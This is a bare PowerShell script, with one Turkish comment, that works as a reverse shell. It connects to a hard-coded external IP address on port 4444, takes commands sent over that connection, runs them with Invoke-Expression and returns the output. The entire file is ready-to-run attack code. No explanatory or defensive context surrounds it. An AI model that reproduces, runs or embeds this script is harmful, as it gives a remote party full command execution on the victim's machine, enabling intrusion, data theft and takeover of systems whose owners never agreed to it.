$LHOST = "185.87.253.242"
$LPORT = 4444

$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024

while ($TCPClient.Connected) {
    while ($NetworkStream.DataAvailable) {
        $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
        # Gelen veriyi UTF8 olarak oku (düzeltme: $RawData kadar alıyoruz)
        $Code = ([Text.Encoding]::UTF8).GetString($Buffer, 0, $RawData)
    }

    if ($TCPClient.Connected -and $Code.Length -gt 1) {
        $Output = try { Invoke-Expression $Code 2>&1 } catch { $_ }
        $StreamWriter.Write("$Output`n")
        $Code = $null
    }
}

$StreamWriter.Close()
$StreamReader.Close()
$NetworkStream.Close()
$TCPClient.Close()
